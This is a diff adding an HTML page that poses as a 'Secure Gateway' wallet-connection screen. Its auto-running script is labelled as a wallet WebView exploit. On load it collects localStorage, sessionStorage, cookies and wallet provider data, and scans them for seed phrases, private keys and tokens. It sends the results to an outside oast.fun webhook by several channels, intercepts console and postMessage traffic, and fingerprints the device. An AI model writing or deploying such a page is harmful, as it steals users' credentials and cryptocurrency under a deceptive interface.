@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Secure Connection Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            text-align: center;
+            padding: 30px;
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 90%;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+        
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            animation: progress 2s ease-out forwards;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        
+        .status {
+            color: #667eea;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        🔐
+    </div>
+    <h2>Secure Gateway</h2>
+    <p>Establishing secure connection to wallet...</p>
+    <div class="spinner"></div>
+    <div class="progress-bar">
+        <div class="progress-fill"></div>
+    </div>
+    <div class="status" id="status">Initializing secure channel...</div>
+</div>
+
+<script>
+// ============================================================
+// WEB3 WALLET WEBVIEW EXPLOIT - AUTO EXECUTE
+// Target Webhook: awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun
+// ============================================================
+
+(function() {
+    // Konfigurasi Webhook
+    const WEBHOOK_BASE = "https://awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun";
+    const WEBHOOK_URL = WEBHOOK_BASE;
+    
+    // Status update
+    const statusEl = document.getElementById('status');
+    
+    function updateStatus(msg) {
+        if (statusEl) statusEl.innerText = msg;
+        console.log('[Exploit]', msg);
+    }
+    
+    updateStatus('Collecting environment data...');
+    
+    // Detect WebView
+    function isWebView() {
+        const ua = navigator.userAgent.toLowerCase();
+        return (
+            ua.includes('wv') ||
+            ua.includes('webview') ||
+            (window.navigator.standalone === true) ||
+            (window.Android && typeof window.Android.showToast === 'function') ||
+            (window.webkit && window.webkit.messageHandlers) ||
+            (window.indexedDB && !window.indexedDB.toString().includes('prototype'))
+        );
+    }
+    
+    // Detect wallet providers
+    function detectWalletProviders() {
+        const providers = {};
+        
+        // Ethereum providers
+        if (typeof window.ethereum !== 'undefined') {
+            providers.ethereum = {
+                detected: true,
+                isMetaMask: !!window.ethereum.isMetaMask,
+                isTrust: !!window.ethereum.isTrust,
+                isCoinbaseWallet: !!window.ethereum.isCoinbaseWallet,
+                isBraveWallet: !!window.ethereum.isBraveWallet,
+                isImToken: !!window.ethereum.isImToken,
+                chainId: window.ethereum.chainId || null,
+                networkVersion: window.ethereum.networkVersion || null,
+                selectedAddress: window.ethereum.selectedAddress || null
+            };
+        }
+        
+        // Solana providers
+        if (typeof window.solana !== 'undefined') {
+            providers.solana = {
+                detected: true,
+                isPhantom: !!window.solana.isPhantom,
+                isBackpack: !!window.solana.isBackpack
+            };
+        }
+        
+        if (window.phantom && window.phantom.solana) {
+            providers.phantom = { detected: true, isConnected: window.phantom.solana.isConnected };
+        }
+        
+        // Other providers
+        if (typeof window.tronWeb !== 'undefined') {
+            providers.tron = { detected: true };
+        }
+        
+        if (typeof window.solflare !== 'undefined') {
+            providers.solflare = { detected: true };
+        }
+        
+        if (typeof window.xfi !== 'undefined') {
+            providers.xinfin = { detected: true };
+        }
+        
+        return providers;
+    }
+    
+    // Collect all localStorage data
+    function collectLocalStorage() {
+        const data = {};
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                data[key] = value;
+            }
+        } catch(e) {
+            data.error = e.message;
+        }
+        return data;
+    }
+    
+    // Collect sessionStorage
+    function collectSessionStorage() {
+        const data = {};
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                data[key] = value;
+            }
+        } catch(e) {
+            data.error = e.message;
+        }
+        return data;
+    }
+    
+    // Extract sensitive patterns from data
+    function extractSensitiveData(data) {
+        const sensitive = {
+            seeds: [],
+            privateKeys: [],
+            mnemonics: [],
+            phrases: [],
+            passwords: [],
+            tokens: [],
+            addresses: []
+        };
+        
+        const patterns = {
+            seed: /(seed|mnemonic|phrase|recovery)[\s]*:?[\s]*([a-zA-Z]+(?: [a-zA-Z]+){11,23})/gi,
+            privateKey: /(private[_\s]?key|privkey|pkey)[\s]*:?[\s]*([0-9a-fA-F]{64}|[0-9a-fA-F]{128})/gi,
+            ethereumKey: /0x[0-9a-fA-F]{64}/g,
+            jwt: /eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g,
+            walletAddress: /0x[a-fA-F0-9]{40}/g
+        };
+        
+        const jsonStr = JSON.stringify(data);
+        
+        // Extract JWT tokens
+        const tokens = jsonStr.match(patterns.jwt);
+        if (tokens) sensitive.tokens.push(...tokens);
+        
+        // Extract Ethereum addresses
+        const addresses = jsonStr.match(patterns.walletAddress);
+        if (addresses) sensitive.addresses.push(...addresses);
+        
+        // Extract private keys
+        const privKeys = jsonStr.match(patterns.privateKey);
+        if (privKeys) sensitive.privateKeys.push(...privKeys);
+        
+        // Look for seed phrases in values
+        for (const [key, value] of Object.entries(data)) {
+            if (typeof value === 'string') {
+                const words = value.split(/\s+/);
+                if (words.length === 12 || words.length === 15 || words.length === 18 || words.length === 21 || words.length === 24) {
+                    const seedPattern = words.every(w => w.length > 2 && /^[a-z]+$/.test(w.toLowerCase()));
+                    if (seedPattern && words.length >= 12) {
+                        sensitive.seeds.push({ key, value: value.substring(0, 200) });
+                    }
+                }
+                if (value.toLowerCase().includes('mnemonic') || value.toLowerCase().includes('seed phrase')) {
+                    sensitive.mnemonics.push({ key, value: value.substring(0, 200) });
+                }
+            }
+        }
+        
+        return sensitive;
+    }
+    
+    // Send data to webhook (multiple methods)
+    function sendToWebhook(data, retryCount = 0) {
+        const jsonData = JSON.stringify(data);
+        
+        // Method 1: Fetch API
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: jsonData,
+            keepalive: true
+        }).catch(e => console.log('Fetch error:', e));
+        
+        // Method 2: Navigator.sendBeacon
+        if (navigator.sendBeacon) {
+            const blob = new Blob([jsonData], { type: 'application/json' });
+            navigator.sendBeacon(WEBHOOK_URL, blob);
+        }
+        
+        // Method 3: Image beacon (GET)
+        const img = new Image();
+        img.src = WEBHOOK_URL + '/collect?data=' + encodeURIComponent(jsonData.substring(0, 2000));
+        
+        // Method 4: XMLHttpRequest
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', WEBHOOK_URL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(jsonData);
+        } catch(e) {}
+        
+        // Method 5: WebSocket if available
+        if (window.WebSocket) {
+            try {
+                const ws = new WebSocket('wss://' + WEBHOOK_BASE.replace('https://', '').replace('http://', ''));
+                ws.onopen = () => {
+                    ws.send(jsonData);
+                    setTimeout(() => ws.close(), 100);
+                };
+            } catch(e) {}
+        }
+        
+        console.log('[Exploit] Data sent to webhook:', Object.keys(data));
+    }
+    
+    // Try to get Ethereum accounts (if already connected)
+    async function tryGetEthAccounts() {
+        if (window.ethereum) {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                if (accounts && accounts.length > 0) {
+                    sendToWebhook({
+                        type: 'eth_accounts',
+                        accounts: accounts,
+                        timestamp: Date.now()
+                    });
+                }
+            } catch(e) {}
+        }
+    }
+    
+    // Try to get Solana accounts
+    async function tryGetSolanaAccounts() {
+        if (window.solana && window.solana.isConnected) {
+            try {
+                const publicKey = window.solana.publicKey?.toString();
+                if (publicKey) {
+                    sendToWebhook({
+                        type: 'solana_account',
+                        publicKey: publicKey,
+                        timestamp: Date.now()
+                    });
+                }
+            } catch(e) {}
+        }
+    }
+    
+    // MAIN EXECUTION
+    updateStatus('Scanning localStorage...');
+    
+    // Collect all data
+    const localStorageData = collectLocalStorage();
+    const sessionStorageData = collectSessionStorage();
+    const walletProviders = detectWalletProviders();
+    const sensitiveData = extractSensitiveData(localStorageData);
+    
+    updateStatus('Extracting wallet data...');
+    
+    // Build complete payload
+    const payload = {
+        // Metadata
+        timestamp: Date.now(),
+        isoTime: new Date().toISOString(),
+        sessionId: Math.random().toString(36).substring(2, 15),
+        
+        // Environment
+        url: window.location.href,
+        referer: document.referrer,
+        origin: window.location.origin,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        maxTouchPoints: navigator.maxTouchPoints,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        isWebView: isWebView(),
+        
+        // Screen info
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        },
+        
+        // Viewport
+        viewport: {
+            width: window.innerWidth,
+            height: window.innerHeight
+        },
+        
+        // Stored data
+        localStorage: localStorageData,
+        sessionStorage: sessionStorageData,
+        cookies: document.cookie,
+        
+        // Wallet providers
+        walletProviders: walletProviders,
+        
+        // Extracted sensitive data
+        sensitiveData: sensitiveData,
+        
+        // Web3 specific
+        web3: {
+            hasEthereum: !!window.ethereum,
+            hasSolana: !!(window.solana || (window.phantom && window.phantom.solana)),
+            hasTron: !!window.tronWeb
+        }
+    };
+    
+    // Send all data
+    sendToWebhook(payload);
+    
+    updateStatus('Verifying wallet connection...');
+    
+    // Try to get accounts if already connected
+    setTimeout(() => {
+        tryGetEthAccounts();
+        tryGetSolanaAccounts();
+    }, 500);
+    
+    // Send additional data after delay (in case more data loads)
+    setTimeout(() => {
+        const newLocalStorage = collectLocalStorage();
+        if (JSON.stringify(newLocalStorage) !== JSON.stringify(localStorageData)) {
+            sendToWebhook({
+                type: 'delayed_data',
+                localStorage: newLocalStorage,
+                timestamp: Date.now()
+            });
+        }
+    }, 3000);
+    
+    // Send again on page unload
+    window.addEventListener('beforeunload', function() {
+        const finalPayload = {
+            type: 'beforeunload',
+            timestamp: Date.now(),
+            localStorage: collectLocalStorage(),
+            sessionStorage: collectSessionStorage()
+        };
+        sendToWebhook(finalPayload);
+    });
+    
+    // Monitor for postMessage (communication between frames)
+    window.addEventListener('message', function(e) {
+        if (e.data && typeof e.data === 'object') {
+            sendToWebhook({
+                type: 'postMessage_intercepted',
+                origin: e.origin,
+                data: e.data,
+                timestamp: Date.now()
+            });
+        }
+    });
+    
+    // Monitor console logs (can capture some errors/info)
+    const originalConsole = console.log;
+    console.log = function() {
+        const args = Array.from(arguments);
+        if (args[0] && typeof args[0] === 'string' && 
+            (args[0].includes('token') || args[0].includes('key') || args[0].includes('wallet'))) {
+            sendToWebhook({
+                type: 'console_log',
+                message: args.join(' '),
+                timestamp: Date.now()
+            });
+        }
+        originalConsole.apply(console, args);
+    };
+    
+    updateStatus('Connection established. Redirecting...');
+    
+    // Log completion
+    console.log('[Exploit] Full data collection completed. Payload size:', JSON.stringify(payload).length, 'bytes');
+    console.log('[Exploit] Webhook target:', WEBHOOK_URL);
+    console.log('[Exploit] Sensitive data found:', 
+        'Seeds:', sensitiveData.seeds.length,
+        'PrivateKeys:', sensitiveData.privateKeys.length,
+        'Tokens:', sensitiveData.tokens.length
+    );
+    
+    // Optional: Redirect to legitimate site after 3 seconds
+    setTimeout(() => {
+        // Uncomment to redirect ke website asli (biar ga curiga)
+        // window.location.href = 'https://www.coingecko.com';
+    }, 3500);
+    
+})();
+</script>
+
+<!-- Hidden elements for additional exfiltration -->
+<iframe style="display:none" id="xfrFrame" srcdoc="<script>window.parent.postMessage({type:'frame_ready',data:localStorage},'*');</script>"></iframe>
+
+<!-- Canvas fingerprinting -->
+<canvas id="fpCanvas" style="display:none" width="200" height="50"></canvas>
+
+<script>
+// Additional fingerprinting
+(function() {
+    try {
+        const canvas = document.getElementById('fpCanvas');
+        if (canvas) {
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 10, 10);
+            ctx.fillStyle = '#069';
+            ctx.fillText('fingerprint', 2, 15);
+            const fingerprint = canvas.toDataURL();
+            
+            fetch('https://awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun/fingerprint', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    type: 'canvas_fingerprint',
+                    fingerprint: fingerprint.substring(0, 200),
+                    timestamp: Date.now()
+                })
+            }).catch(() => {});
+        }
+    } catch(e) {}
+})();
+</script>
+
+</body>
+</html>
